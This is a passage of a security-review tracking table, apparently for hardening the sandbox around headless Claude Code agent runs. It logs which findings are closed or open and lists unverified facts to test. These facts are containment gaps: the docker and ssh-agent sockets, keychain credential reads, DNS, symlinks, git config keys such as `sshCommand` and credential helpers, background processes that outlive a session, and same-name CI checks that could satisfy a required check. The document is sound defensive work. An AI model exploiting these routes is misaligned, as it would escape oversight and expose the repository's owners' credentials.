| TL2-12 tiers / ladder | **Closed** | Out of scope. |
| TL2-13 HMAC / workflow self-check | **Mostly closed** | Ed25519 plus `pull_request_target`. Open: hash recompute, job hardening, same-name checks, test-job token (TL3-13). |
| TL2-14 nested instruction files | **Partly** | Protected path plus G13. Supervised mode still exposes Rex; imports and skill folders (TL3-11). |
| TL2-15 stacking rebase | **Closed** | `--onto`, `--force-with-lease`, trust root from `main` (`04:402-404`). |
| TL2-16 red-team / §G gaps | **Partly** | Red-team list expanded (`04:926-942`, `07:159`). Missing: docker socket, keychain, DNS, symlinks, container `.git` write, empty allowlist (TL3-3/4/5); supervised runs not gated on it (TL3-9). |

## New UNVERIFIED facts to add to `05` §G

| # | Fact | Unit |
|---|---|---|
| G16 | A headless `-p` run works with an empty sandbox `allowedDomains` (Claude's own API traffic isn't proxied) | 13 |
| G17 | Claude Code file tools and `--restricted` resolve symlinks before matching rules | 13 (attack in 16) |
| G18 | From sandboxed Bash: the docker socket, the `ssh-agent` socket, `git credential fill` (osxkeychain) and `security find-*-password` are blocked; `allowUnixSockets` semantics | 13 |
| G19 | DNS resolution of outside names from sandboxed Bash and from an `internal: true` compose network (Docker Desktop) | 13 / 14 |
| G20 | Sandbox precedence of `allowWrite` inside a `denyWrite` path; glob support in `denyRead` | 13 |
| G21 | Claude Code kills background processes started by Bash when a `-p` session ends | 17 |
| G22 | `CLAUDE_CONFIG_DIR` isolates user settings, memory, skills and `~/.claude.json` for `-p` runs | 13 |
| G23 | `.git/config` keys beyond `hooksPath`/`fsmonitor` (filter, `sshCommand`, credential helper, `gpg.program`, `include.path`) and `GIT_CONFIG_NOSYSTEM`/`GIT_CONFIG_GLOBAL` behaviour; extends G15 | 14 |
| G11+ | A PR-added job with the same name can satisfy a required check; the default `GITHUB_TOKEN` permissions on the pilot repo | 52 |
